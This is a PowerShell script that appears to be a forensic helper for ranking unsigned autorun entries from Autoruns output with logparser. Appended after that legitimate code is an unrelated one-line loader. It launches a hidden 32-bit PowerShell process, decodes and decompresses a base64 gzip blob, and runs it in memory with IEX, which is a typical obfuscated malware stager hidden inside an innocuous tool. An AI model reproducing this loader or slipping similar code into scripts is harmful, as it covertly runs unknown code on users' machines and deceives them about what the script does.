


if (Get-Command logparser.exe) {
    $lpquery = @"
    SELECT
        COUNT(ImagePath, LaunchString, MD5) as ct,
        ImagePath,
        LaunchString,
        MD5,
        Publisher
    FROM
        *autorunsc.tsv
    WHERE
        Publisher not like '(Verified)%' and
        (ImagePath not like 'File not found%')
    GROUP BY
        ImagePath,
        LaunchString,
        MD5,
        Publisher
    ORDER BY
        ct ASC
"@

    & logparser -stats:off -i:csv -dtlines:0 -fixedsep:on -rtp:-1 "$lpquery"

} else {
    $ScriptName = [System.IO.Path]::GetFileName($MyInvocation.ScriptName)
    "${ScriptName} requires logparser.exe in the path."
}


if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAFHL6FcCA71W/2/aOhD/uZP2P0QTEolGCVDWdpUmPYfwJS2h0EAoMDS5iRMMJqaOoYW9/e/vAqFlb+3Utx9eBIrtO5/Pn/vcXYJl5EnKIwUPmMeugkvXVr6/f3fUxgLPFTWzua9addss5ZSMsGLRWbCbU+3oCDQytHsllS+KOkKLhcnnmEbji4vKUggSyd08XycSxTGZ3zFKYlVT/lb6EyLI8fXdlHhS+a5kvuXrjN9hlqqtK9ibEOUYRX4ia3IPJ97lnQWjUs1+/ZrVRsfFcb56v8QsVrPOOpZknvcZy2rKDy05sLteEDVrU0/wmAcy36fRSSnfi2IckBZYWxGbyAn346wGt4CfIHIpImV7n8TATqxmYdgW3EO+L0gM2nkrWvEZUTPRkrGc8pc6Sk+/WUaSzgnIJRF84RCxoh6J8w0c+YzckGCstsjD/tJv3aQebgKtthRaDiLygps295eM7HZmtV8dfYqiBs9PkQQIfrx/9/5dsKfBeiLPbwd9qyOdQx7A6Gi0HRNwV23zmG7VvyiFnGLDwVhysYZppiuWRBsroyQMo/EYDvO/OVbudQPFvTbozja1VbELiyOXU38Mm9IYZWb3l/TE7znxqZWIX6ecSQIaEXMd4Tn19qxSXwoACRjZXjq/V2uBd2o2FRDfJIyEWCaQ5pTRr9uqcyqf9hpLynwikAdBjMEriK/2szO7KKlZK7LJHNDazbMQjwC4TPbaKX/X+9OTOShlKwzHcU5pLyGZvJziEMyIn1NQFNNUhJaSb4fZZ3ftJZPUw7Hcmxtr/4IzPbbCo1iKpQdxBAi6zoJ4FLMEkZzSoD4x1g4N98dnX8SjghmjUQiWVhAPWElwcGTCDuHnUiZoeYdIa75gZA5K2+yuMRxCLqcZseUTDomffcXTPfF3LE+g2WNy4CfE22Fc5hSXCgm1IoF5x64/dOSgUBy6VBEkjZG6z6WRsZYJ9TO8ZCRcTYHawiIkQFITfG7gmJyWHSkAMPWDfk0rCJ6BFTHbM2a0iB5o0bLh36MnFjfP/KvLaUMX5uMkQFZs2Y222Wk0yqtLxy1Lp2rJq7Yl7ertdOqgxk1vIIcWanRpYTYobxaXdOM0kT941E83xuahYDxupqEfDMwgCM8C56b4qUab/UrHKJRw06wum33jwSiU4yp9aHRorzO7rMm7gctwL9DD2+JnTB+bYuoWub2xEKpPTrzNZeDWJ7a/HjT0z/3yDFURqkRVt2bwq4EhUFt3cejy/n1B6P2wggzPpmTY6dWMTqdmoF59em9+1kPYe4snRt8t0eHi9mYC8xq4cKUXypZPNnzQAZDqHOHwBnTCSsmbBKBjfkTGxxaPS3hmcGSATm14D34NFrU2A3m3V+LIZa1bjJrDdU3Xi4N2GTUKtF8PUWISh0YHo3hlbky96Prc739qDQLdvWVnulnpLrxA1/WHhnnlDYuP59dn580+decc9XTd/ZCwA+iRWcnhtbtptg5i/lqRt7GIJ5gBF6B67zOzxkUtLcNtTpMdqnrQlWdERIRBK4Nmt2c1Yox7SVc4LNvQmHbtYgxZ2oPhSenFkaY8KWrPTWO/dHExBJchWYDF+SaJQjnJFR5PCgUo+IXHcgFu/fZbVvhirSaWckm/eEIqtc621rUkdzJ+YXVfP/8/IEwzdwIv/40QPq/9RvomWAu5ZxB+Ef288J+A/kMs+phK0HegGDGya5O/hSQl0MGnxi5uwJAgfZKPveulPG7BN8g/6nlhxGUKAAA=''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

